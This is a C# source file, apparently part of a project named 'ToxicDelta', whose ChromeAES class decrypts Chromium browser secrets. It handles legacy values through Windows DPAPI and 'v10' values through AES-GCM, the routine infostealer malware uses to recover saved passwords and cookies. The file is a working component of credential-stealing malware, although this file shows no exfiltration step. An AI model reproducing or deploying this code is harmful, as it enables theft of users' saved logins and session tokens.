using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Security.Cryptography;
using Org.BouncyCastle.Crypto;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Parameters;

namespace ToxicDelta.Chromium
{
    public class ChromeAES
    {
        public static string Decrypt(byte[] encrypted, byte[] aesKey)
        {
            try
            {
                if (Encoding.UTF8.GetString(encrypted, 0, 3) != "v10")
                {
                    byte[] decrypted = ProtectedData.Unprotect(encrypted, null, DataProtectionScope.CurrentUser);
                    return Encoding.UTF8.GetString(decrypted);
                }

                byte[] nonce = new byte[12];
                Array.Copy(encrypted, 3, nonce, 0, 12);

                int tagLength = 16;
                int payloadLength = encrypted.Length - 3 - nonce.Length - tagLength;

                byte[] ciphertext = new byte[payloadLength];
                byte[] tag = new byte[tagLength];

                Array.Copy(encrypted, 15, ciphertext, 0, payloadLength);
                Array.Copy(encrypted, encrypted.Length - tagLength, tag, 0, tagLength);

                byte[] input = new byte[ciphertext.Length + tag.Length];
                Array.Copy(ciphertext, 0, input, 0, ciphertext.Length);
                Array.Copy(tag, 0, input, ciphertext.Length, tag.Length);

                GcmBlockCipher cipher = new GcmBlockCipher(new Org.BouncyCastle.Crypto.Engines.AesEngine());
                AeadParameters parameters = new AeadParameters(new KeyParameter(aesKey), tagLength * 8, nonce);
                cipher.Init(false, parameters); // false = decrypt

                byte[] plain = new byte[ciphertext.Length];
                int len = cipher.ProcessBytes(input, 0, input.Length, plain, 0);
                cipher.DoFinal(plain, len);

                return Encoding.UTF8.GetString(plain);
            }
            catch
            {
                return "[ Decryption Failed! ]";
            }
        }
    }
}
